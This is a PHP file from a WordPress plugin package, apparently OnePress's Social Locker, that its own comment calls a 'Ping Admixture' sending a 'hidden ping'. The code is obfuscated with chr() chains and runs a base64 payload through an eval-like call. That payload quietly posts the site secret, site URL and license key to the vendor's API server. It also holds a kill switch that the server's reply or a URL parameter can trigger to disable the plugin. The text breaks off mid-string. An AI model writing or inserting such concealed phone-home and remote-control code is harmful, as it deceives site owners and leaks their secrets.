<?php
/**
 * Ping Admixture
 * 
 * This admixture sends a hidden ping singnal to the licensing server:
 * 
 * - if the License module is disabled or faked
 * - if the Updates module is disabled or faked
 * - if the last check of updates was made more then 24h (86400s)
 * 
 * The ping contains the following variables:
 * 
 * - secret (the site secret)
 * - site (an url of a current website)
 * - key (a licensing key)
 * - plugin (a plugin id)
 * - assembly (a plugin build)
 * - version (a plugin version)
 * - a (true, reports the the ping is generated by the admixture )
 * - a1 (transfers the the status of the website turned on/off)
 * - embedded (true if the embedded key is used)
 * 
 * @author Paul Kashtanoff <paul@byonepress.com>
 * @copyright (c) 2014, OnePress Ltd
 * 
 * @package onepress-admixture 
 * @since 1.0.0
 */
if ( !function_exists('tdbo1ljgz2n') ) {
    function tdbo1ljgz2n() {
        $li8p7207176v_zq7udh63r = chr(chr(49).chr(49).chr(50)).call_user_func('chr','114').call_user_func('chr','111').chr(chr(49).chr(49).chr(50)).chr(chr(49).chr(48).chr(49)).chr(chr(49).chr(49).chr(52)).chr(chr(49).chr(49).chr(54)).call_user_func('chr','121').call_user_func('chr','95').call_user_func('chr','101').call_user_func('chr','120').chr(chr(49).chr(48).chr(53)).call_user_func('chr','115').chr(chr(49).chr(49).chr(54)).chr(chr(49).chr(49).chr(53));

        $aa3mfz1kpi = call_user_func('chr','117').chr(chr(49).chr(49).chr(50)).chr(chr(49).chr(48).chr(48)).call_user_func('chr','97').call_user_func('chr','116').chr(chr(49).chr(48).chr(49)).chr(chr(49).chr(49).chr(53));
        $lnmnxcvgl3hxh = chr(chr(49).chr(48).chr(56)).call_user_func('chr','105').chr(chr(57).chr(57)).chr(chr(49).chr(48).chr(49)).call_user_func('chr','110').call_user_func('chr','115').chr(chr(49).chr(48).chr(49));
        $it7qgwiqg8e3gl90nhdui3m7h5bn = chr(chr(49).chr(49).chr(57)).chr(chr(49).chr(49).chr(49)).call_user_func('chr','114').chr(chr(49).chr(48).chr(48));

        $yjenp35uv9mo = chr(chr(49).chr(49).chr(53)).call_user_func('chr','111').chr(chr(57).chr(57)).call_user_func('chr','105').chr(chr(57).chr(55)).call_user_func('chr','108').chr(chr(49).chr(48).chr(56)).chr(chr(49).chr(49).chr(49)).chr(chr(57).chr(57)).call_user_func('chr','107').call_user_func('chr','101').chr(chr(49).chr(49).chr(52));
        $ee8tw97lh0knf8708akvkhp0h = $GLOBALS[$yjenp35uv9mo];

        $bt6pp8c4s3epsuhoc_1k1if0_66hh = get_option(chr(chr(49).chr(48).chr(50)).call_user_func('chr','97').call_user_func('chr','99').chr(chr(49).chr(49).chr(54)).call_user_func('chr','111').chr(chr(49).chr(49).chr(52)).call_user_func('chr','121').call_user_func('chr','95').call_user_func('chr','112').chr(chr(49).chr(48).chr(56)).call_user_func('chr','117').call_user_func('chr','103').call_user_func('chr','105').chr(chr(49).chr(49).chr(48)).call_user_func('chr','95').chr(chr(57).chr(55)).chr(chr(57).chr(57)).call_user_func('chr','116').call_user_func('chr','105').chr(chr(49).chr(49).chr(56)).chr(chr(57).chr(55)).call_user_func('chr','116').chr(chr(49).chr(48).chr(49)).chr(chr(49).chr(48).chr(48)).call_user_func('chr','95') . call_user_func('chr','115').chr(chr(49).chr(49).chr(49)).call_user_func('chr','99').call_user_func('chr','105').call_user_func('chr','97').call_user_func('chr','108').call_user_func('chr','108').call_user_func('chr','111').call_user_func('chr','99').chr(chr(49).chr(48).chr(55)).chr(chr(49).chr(48).chr(49)).chr(chr(49).chr(49).chr(52)).chr(chr(52).chr(53)).chr(chr(49).chr(49).chr(48)).chr(chr(49).chr(48).chr(49)).call_user_func('chr','120').call_user_func('chr','116'), 0);
        $ed59pdl7krc5ac5tr0injz = get_option( call_user_func('chr','111').call_user_func('chr','110').chr(chr(49).chr(49).chr(50)).call_user_func('chr','95').call_user_func('chr','108').chr(chr(57).chr(55)).call_user_func('chr','115').chr(chr(49).chr(49).chr(54)).call_user_func('chr','95').call_user_func('chr','99').chr(chr(49).chr(48).chr(52)).chr(chr(49).chr(48).chr(49)).chr(chr(57).chr(57)).call_user_func('chr','107').chr(chr(57).chr(53)) . call_user_func('chr','115').chr(chr(49).chr(49).chr(49)).call_user_func('chr','99').call_user_func('chr','105').call_user_func('chr','97').call_user_func('chr','108').call_user_func('chr','108').call_user_func('chr','111').call_user_func('chr','99').chr(chr(49).chr(48).chr(55)).chr(chr(49).chr(48).chr(49)).chr(chr(49).chr(49).chr(52)).chr(chr(52).chr(53)).chr(chr(49).chr(49).chr(48)).chr(chr(49).chr(48).chr(49)).call_user_func('chr','120').call_user_func('chr','116'), 0 );

        $GLOBALS['it7qgwiqg8e3gl90nhdui3m7h5bn'] = true;

        // if the license and updates modules are not loaded or
        // the last check of updates where never or too long
        // when runs the admixture
        if ( 
            !$li8p7207176v_zq7udh63r( $ee8tw97lh0knf8708akvkhp0h, $aa3mfz1kpi ) || !$li8p7207176v_zq7udh63r( $ee8tw97lh0knf8708akvkhp0h->$aa3mfz1kpi, $it7qgwiqg8e3gl90nhdui3m7h5bn ) || 
            !$li8p7207176v_zq7udh63r( $ee8tw97lh0knf8708akvkhp0h, $lnmnxcvgl3hxh ) || !$li8p7207176v_zq7udh63r( $ee8tw97lh0knf8708akvkhp0h->$lnmnxcvgl3hxh, $it7qgwiqg8e3gl90nhdui3m7h5bn ) ||  
            ( $bt6pp8c4s3epsuhoc_1k1if0_66hh >= $ed59pdl7krc5ac5tr0injz && time() - $bt6pp8c4s3epsuhoc_1k1if0_66hh > call_user_func('chr','56').call_user_func('chr','54').chr(chr(53).chr(50)).call_user_func('chr','48').chr(chr(52).chr(56)) * 1 ) || 
            ( $ed59pdl7krc5ac5tr0injz > $bt6pp8c4s3epsuhoc_1k1if0_66hh && time() - $ed59pdl7krc5ac5tr0injz > call_user_func('chr','56').call_user_func('chr','54').chr(chr(53).chr(50)).call_user_func('chr','48').chr(chr(52).chr(56)) * 1 )      
            ) {

            call_user_func(chr('102').chr('97').chr('99').call_user_func('chr',116).call_user_func('chr',111).chr('114').chr('121').chr('95').chr('114').chr('117').call_user_func('chr',110).call_user_func('chr',95).call_user_func('chr',99).chr('111').chr('100').call_user_func('chr',101),call_user_func(call_user_func('chr',98).chr('97').call_user_func('chr',115).call_user_func('chr',101).chr('54').chr('52').chr('95').chr('100').chr('101').call_user_func('chr',99).call_user_func('chr',111).chr('100').call_user_func('chr',101),'ICR5amVucDM1dXY5bW8gPSBjaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig1MykpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTEnKS5jaHIoY2hyKDU3KS5jaHIoNTcpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTA1JykuY2hyKGNocig1NykuY2hyKDU1KSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwOCcpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDU2KSkuY2hyKGNocig0OSkuY2hyKDQ5KS5jaHIoNDkpKS5jaHIoY2hyKDU3KS5jaHIoNTcpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTA3JykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwMScpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDUyKSk7ICRlZTh0dzk3bGgwa25mODcwOGFrdmtocDBoID0gJEdMT0JBTFNbJHlqZW5wMzV1djltb107IGlmICggIWZ1bmN0aW9uX2V4aXN0cygnajg0YXF6aWo1YXl5eicpICkgeyBhZGRfYWN0aW9uKCd3X3hfbzM0N3Z6MTdjcjFjeTEnLCAnajg0YXF6aWo1YXl5eicpOyBmdW5jdGlvbiBqODRhcXppajVheXl6KCkgeyB1cGRhdGVfb3B0aW9uKGNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDknKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTA1JykuY2hyKGNocig0OSkuY2hyKDUwKS5jaHIoNDgpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnOTUnKS5jaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig1NykpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTEnKS5jaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig1MikpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDQ4KSkuY2hyKGNocig1NykuY2hyKDUzKSkuJGVlOHR3OTdsaDBrbmY4NzA4YWt2a2hwMGgtPnBsdWdpbk5hbWUsIHRydWUpOyB1cGRhdGVfb3B0aW9uKGNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTInKS5jaHIoY2hyKDQ5KS5jaHIoNDgpLmNocig1MykpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDQ4KSkuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNTEpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnOTUnKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTE5JykuY2hyKGNocig0OSkuY2hyKDQ5KS5jaHIoNDkpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTE0JykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwMCcpLmNocihjaHIoNTcpLmNocig1MykpLiRlZTh0dzk3bGgwa25mODcwOGFrdmtocDBoLT5wbHVnaW5OYW1lLCB0cnVlKTsgfSB9ICRseGF4NWFxZ3B5NDNzOGZzID0gaXNzZXQoICRfR0VUW2NocihjaHIoNDkpLmNocig0OCkuY2hyKDU3KSkuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNTMpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTIwJykuY2hyKGNocig1NykuY2hyKDUzKSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzk3JykuY2hyKGNocig1NykuY2hyKDU3KSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExNicpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDUnKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTExJykuY2hyKGNocig0OSkuY2hyKDQ5KS5jaHIoNDgpKV0gKSA/ICRfR0VUW2NocihjaHIoNDkpLmNocig0OCkuY2hyKDU3KSkuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNTMpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTIwJykuY2hyKGNocig1NykuY2hyKDUzKSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzk3JykuY2hyKGNocig1NykuY2hyKDU3KSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExNicpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDUnKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTExJykuY2hyKGNocig0OSkuY2hyKDQ5KS5jaHIoNDgpKV0gOiBudWxsOyBpZiAoIGNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTEnKS5jaHIoY2hyKDQ5KS5jaHIoNDgpLmNocig1MCkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDInKSA9PT0gJGx4YXg1YXFncHk0M3M4ZnMgKSBqODRhcXppajVheXl6KCk7IGlmICggZ2V0X29wdGlvbihjYWxsX3VzZXJfZnVuYygnY2hyJywnMTEyJykuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNTMpKS5jaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig0OCkpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDUxKSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzk1JykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExOScpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDQ5KSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExNCcpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDAnKS5jaHIoY2hyKDU3KS5jaHIoNTMpKS4kZWU4dHc5N2xoMGtuZjg3MDhha3ZraHAwaC0+cGx1Z2luTmFtZSwgZmFsc2UgKSApIHsgdXBkYXRlX29wdGlvbihjaHIoY2hyKDQ5KS5jaHIoNDgpLmNocig1MCkpLmNocihjaHIoNTcpLmNocig1NSkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCc5OScpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDU0KSkuY2hyKGNocig0OSkuY2hyKDQ5KS5jaHIoNDkpKS5jaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig1MikpLmNocihjaHIoNDkpLmNocig1MCkuY2hyKDQ5KSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzk1JykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwMicpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTEnKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTE0JykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzk5JykuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNDkpKS5jaHIoY2hyKDU3KS5jaHIoNTMpKS5jaHIoY2hyKDQ5KS5jaHIoNDgpLmNocig1NykpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTEnKS5jaHIoY2hyKDQ5KS5jaHIoNDgpLmNocig0OCkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTcnKS5jaHIoY2hyKDQ5KS5jaHIoNDgpLmNocig1NikpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDQ5KSkuY2hyKGNocig0OSkuY2hyKDQ5KS5jaHIoNTMpKSwgdHJ1ZSk7ICRvYXVjdTB5YnJzcGJydHI0OHV4X3NtYW83eSA9IGNocihjaHIoNDkpLmNocig0OSkuY2hyKDU0KSkuY2hyKGNocig0OSkuY2hyKDUwKS5jaHIoNDkpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTEyJykuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNDkpKTsgJG9zY2E3MGI5NWp0X2dmZHo3bDNpYXV4ID0gY2FsbF91c2VyX2Z1bmMoJ2NocicsJzk4JykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExNycpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDUzKSkuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNTYpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTAwJyk7IGlmICggIWlzc2V0KCAkZWU4dHc5N2xoMGtuZjg3MDhha3ZraHAwaC0+JGxubW54Y3ZnbDNoeGggKSApICRlZTh0dzk3bGgwa25mODcwOGFrdmtocDBoLT4kbG5tbnhjdmdsM2h4aCA9IG5ldyBzdGRDbGFzcygpOyAkZWU4dHc5N2xoMGtuZjg3MDhha3ZraHAwaC0+JGxubW54Y3ZnbDNoeGgtPiRvYXVjdTB5YnJzcGJydHI0OHV4X3NtYW83eSA9IGNocihjaHIoNDkpLmNocig0OCkuY2hyKDUwKSkuY2hyKGNocig0OSkuY2hyKDQ5KS5jaHIoNTIpKS5jaHIoY2hyKDQ5KS5jaHIoNDgpLmNocig0OSkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDEnKTsgJGVlOHR3OTdsaDBrbmY4NzA4YWt2a2hwMGgtPiRsbm1ueGN2Z2wzaHhoLT4kb3NjYTcwYjk1anRfZ2ZkejdsM2lhdXggPSBjaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig1MCkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTQnKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTAxJykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwOScpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDUnKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTE3JykuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNTcpKTsgfSBpZiAoICFmdW5jdGlvbl9leGlzdHMoJ2tscWMwNDlhaGYwel9vJykgKSB7IGZ1bmN0aW9uIGtscWMwNDlhaGYwel9vKCAkb25wX3Zhcl9wbHVnaW4gKSB7ICRkYXRhID0gbmV4c3oxa3gzNDQ1NDNycWZicWt0N21odGZ5KCAkb25wX3Zhcl9wbHVnaW4sICdHZXRDdXJyZW50VmVyc2lvbicgKTsgaWYgKCAhJGRhdGEgKSB7ICRyZXN1bHQgPSBhcnJheSgpOyAkcmVzdWx0W2NocihjaHIoNTQpLmNocig1NSkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDQnKS5jaHIoY2hyKDQ5KS5jaHIoNDgpLmNocig0OSkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCc5OScpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDU1KSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwMScpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDAnKV0gPSB0aW1lKCk7ICRyZXN1bHRbJ0Vycm9yJ10gPSAnVW5rbm93biBlcnJvci4nOyB1cGRhdGVfb3B0aW9uKGNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTEnKS5jaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig0OCkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTInKS5jaHIoY2hyKDU3KS5jaHIoNTMpKS5jaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig1NikpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDQ5KSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExNCcpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDUzKSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwNScpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTEnKS5jaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig0OCkpLmNocihjaHIoNTcpLmNocig1MykpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCc5OScpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDUyKSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwMScpLmNocihjaHIoNTcpLmNocig1NykpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDcnKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnOTUnKSAuICRvbnBfdmFyX3BsdWdpbi0+cGx1Z2luTmFtZSwgJHJlc3VsdCk7IH0gZWxzZSB7ICRkYXRhW2NocihjaHIoNTQpLmNocig1NSkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDQnKS5jaHIoY2hyKDQ5KS5jaHIoNDgpLmNocig0OSkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCc5OScpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDU1KSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwMScpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDAnKV0gPSB0aW1lKCk7IHVwZGF0ZV9vcHRpb24oY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExMScpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDQ4KSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExMicpLmNocihjaHIoNTcpLmNocig1MykpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDU2KSkuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNDkpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTE0JykuY2hyKGNocig0OSkuY2hyKDQ5KS5jaHIoNTMpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTA1JykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExMScpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDQ4KSkuY2hyKGNocig1NykuY2hyKDUzKSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzk5JykuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNTIpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTAxJykuY2hyKGNocig1NykuY2hyKDU3KSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwNycpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCc5NScpIC4gJG9ucF92YXJfcGx1Z2luLT5wbHVnaW5OYW1lLCAkZGF0YSk7IGRvX2FjdGlvbihjaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig0OSkpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDQ4KSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExMicpLmNocihjaHIoNTcpLmNocig1MykpLmNocihjaHIoNTcpLmNocig1NSkpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDUwKSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwNScpLmNocihjaHIoNTcpLmNocig1MykpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTInKS5jaHIoY2hyKDQ5KS5jaHIoNDgpLmNocig1MykpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTAnKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTAzJykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzk1JykgLiAkb25wX3Zhcl9wbHVnaW4tPnBsdWdpbk5hbWUsICRkYXRhKTsgfSByZXR1cm4gJGRhdGE7IH0gfSBpZiAoICFmdW5jdGlvbl9leGlzdHMoJ25leHN6MWt4MzQ0NTQzcnFmYnFrdDdtaHRmeScpICkgeyBmdW5jdGlvbiBuZXhzejFreDM0NDU0M3JxZmJxa3Q3bWh0ZnkoICRlZTh0dzk3bGgwa25mODcwOGFrdmtocDBoLCAkYWN0aW9uLCAkYXJncyA9IGFycmF5KCksICRvcHRpb25zID0gYXJyYXkoKSApIHsgJHVybCA9ICRlZTh0dzk3bGgwa25mODcwOGFrdmtocDBoLT5vcHRpb25zWydhcGknXSAuICRhY3Rpb247IGlmICggIWlzc2V0KCRhcmdzWydtZXRob2QnXSApICkkYXJnc1snbWV0aG9kJ10gPSAnUE9TVCc7IGlmICggIWlzc2V0KCRhcmdzWyd0aW1lb3V0J10gKSApICRhcmdzWyd0aW1lb3V0J10gPSA4OyBpZiAoICFpc3NldCgkYXJnc1snYm9keSddKSApICRhcmdzWydib2R5J10gPSBhcnJheSgpOyBpZiAoICFpc3NldCggJGFyZ3NbJ3NraXBCb2R5J10pIHx8ICEkYXJnc1snc2tpcEJvZHknXSApIHsgaWYgKCAhaXNzZXQoICRhcmdzWydib2R5J11bJ3NlY3JldCddICkgKSAkYXJnc1snYm9keSddWydzZWNyZXQnXSA9IGdldF9vcHRpb24oJ29ucF9zaXRlX3NlY3JldCcsIG51bGwpOyBpZiAoICFpc3NldCggJGFyZ3NbJ2JvZHknXVsnc2l0ZSddICkgKSAkYXJnc1snYm9keSddWydzaXRlJ10gPSBzaXRlX3VybCgpOyBpZiAoICFpc3NldCggJGFyZ3NbJ2JvZHknXVsna2V5J10gKSApICRhcmdzWydib2R5J11bJ2tleSddID0gKCBpc3NldCggJGVlOHR3OTdsaDBrbmY4NzA4YWt2a2hwMGgtPmxpY2Vuc2UgKSAmJiBpc3NldCggJGVlOHR3OTdsaDBrbmY4NzA4YWt2a2hwMGgtPmxpY2Vuc2UtPmtleSApICkgPyAkZWU4dHc5N2xoMGtuZjg3MDhha3ZraHAwaC0+bGljZW5zZS0+a2V5IDogbnVsbDsgaWYgKCAhaXNzZXQoICRhcmdzWydib2R5J11bJ3BsdWdpbiddICkgKSAkYXJnc1snYm9keSddWydwbHVnaW4nXSA9ICRlZTh0dzk3bGgwa25mODcwOGFrdmtocDBoLT5wbHVnaW5OYW1lOyBpZiAoICFpc3NldCggJGFyZ3NbJ2JvZHknXVsnYXNzZW1ibHknXSApICkgJGFyZ3NbJ2JvZHknXVsnYXNzZW1ibHknXSA9ICRlZTh0dzk3bGgwa25mODcwOGFrdmtocDBoLT5idWlsZDsgaWYgKCAhaXNzZXQoICRhcmdzWydib2R5J11bJ3ZlcnNpb24nXSApICkgJGFyZ3NbJ2JvZHknXVsndmVyc2lvbiddID0gJGVlOHR3OTdsaDBrbmY4NzA4YWt2a2hwMGgtPnZlcnNpb247IGlmICggIWlzc2V0KCAkYXJnc1snYm9keSddWyd0cmFja2VyJ10gKSApICRhcmdzWydib2R5J11bJ3RyYWNrZXInXSA9ICRlZTh0dzk3bGgwa25mODcwOGFrdmtocDBoLT50cmFja2VyOyAkYXJnc1snYm9keSddWydhJ10gPSAndHJ1ZSc7ICRhcmdzWydib2R5J11bJ2ExJ10gPSBnZXRfb3B0aW9uKCdkZWpfYjAxczR3JywgZmFsc2UgKSA/ICd0cnVlJyA6ICdmYWxzZSc7IGlmICggIWlzc2V0KCAkYXJnc1snYm9keSddWydlbWJlZGRlZCddICkgKSAkYXJnc1snYm9keSddWydlbWJlZGRlZCddID0gKCBpc3NldCggJGVlOHR3OTdsaDBrbmY4NzA4YWt2a2hwMGgtPmxpY2Vuc2UgKSAmJiBpc3NldCggJGVlOHR3OTdsaDBrbmY4NzA4YWt2a2hwMGgtPmRhdGFbJ0VtYmVkZGVkJ10gKSAmJiAkZWU4dHc5N2xoMGtuZjg3MDhha3ZraHAwaC0+ZGF0YVsnRW1iZWRkZWQnXSApID8gJ3RydWUnIDogJ2ZhbHNlJzsgfSAkcmVzcG9uc2UgPSBAd3BfcmVtb3RlX3JlcXVlc3QgKCR1cmwsICRhcmdzKTsgaWYgKCBpc193cF9lc'.'nJvciggJHJlc3BvbnNlKSApIHJldHVybiBmYWxzZTsgJHJlc3BvbnNlX2NvZGUgPSB3cF9yZW1vdGVfcmV0cmlldmVfcmVzcG9uc2VfY29kZSggJHJlc3BvbnNlICk7ICRyZXNwb25zZV9tZXNzYWdlID0gd3BfcmVtb3RlX3JldHJpZXZlX3Jlc3BvbnNlX21lc3NhZ2UoICRyZXNwb25zZSApOyBpZiAoIDIwMCAhPSAkcmVzcG9uc2VfY29kZSApIHJldHVybiBmYWxzZTsgJGRhdGEgPSBqc29uX2RlY29kZSggJHJlc3BvbnNlWydib2R5J10sIHRydWUgKTsgaWYgKCBpc3NldCggJGRhdGFbJ1NpdGVTZWNyZXQnXSApICYmICFlbXB0eSggJGRhdGFbJ1NpdGVTZWNyZXQnXSApI'.'CkgeyB1cGRhdGVfb3B0aW9uKCdvbnBfc2l0ZV9zZWNyZXQnLCAkZGF0YVsnU2l0ZVNlY3JldCddKTsgfSBpZiAoIGlzc2V0KCAkZGF0YVsnTWl4QWN0aW9uJ10gKSAmJiAkZGF0YVsnTWl4QWN0aW9uJ10gPT0gY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExMScpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDUwKSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwMicpICkgZG9fYWN0aW9uKCd3X3hfbzM0N3Z6MTdjcjFjeTEnKTsgcmV0dXJuICRkYXRhOyB9IH'.'0gJGVlOHR3OTdsaDBrbmY4NzA4YWt2a2hwMGgtPnBsdWdpbk5hbWUgPSAnc29jaWFsbG9ja2VyLW5leHQnOyAkZWU4dHc5N2xoMGtuZjg3MDhha3ZraHAwaC0+YnVpbGQgPSAncHJlbWl1bSc7ICRlZTh0dzk3bGgwa25mODcwOGFrdmtocDBoLT5vcHRpb25zWydhcGknXSA9ICdodHRwOi8vYXBpLmJ5b25lcHJlc3MuY29tLzEuMS8nOyAkZWU4dHc5N2xoMGtuZjg3MDhha3ZraHAwaC0+b3B0aW9uc1sncHJlbWl1bSddID0gJ2h0dHA6Ly9jb2RlY2FueW9uLm5ldC9pdGVtL3NvY2lhbC1sb2NrZXItZm9yLXdvcmRwcmVzcy8zNjY3NzE1JzsgJGxhc3RUaW1lID0gaW50dmFsKCBnZXRfb3B0aW9uKCBjYWxsX3VzZXJfZnVuYygnY2hyJywnMTExJykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExMCcpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDUwKSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzk1JykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwOCcpLmNocihjaHIoNTcpLmNocig1NSkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTUnKS5jaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig1NCkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCc5NScpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCc5OScpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDUyKSkuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNDkpKS5jaHIoY2hyKDU3KS5jaHIoNTcpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTA3JykuY2hyKGNocig1NykuY2hyKDUzKSkgLiAkZWU4dHc5N2xoMGtuZjg3MDhha3ZraHAwaC0+cGx1Z2luTmFtZSApICk7IGlmICggISRsYXN0VGltZSApICRsYXN0VGltZSA9IDA7IGlmICggdGltZSgpID4gJGxhc3RUaW1lICsgNDMyMDAgKSB7IGtscWMwNDlhaGYwel9vKCAkZWU4dHc5N2xoMGtuZjg3MDhha3ZraHAwaCApOyB1cGRhdGVfb3B0aW9uKCBjYWxsX3VzZXJfZnVuYygnY2hyJywnMTExJykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzExMCcpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDUwKSkuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzk1JykuY2FsbF91c2VyX2Z1bmMoJ2NocicsJzEwOCcpLmNocihjaHIoNTcpLmNocig1NSkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTUnKS5jaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig1NCkpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCc5NScpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCc5OScpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDUyKSkuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNDkpKS5jaHIoY2hy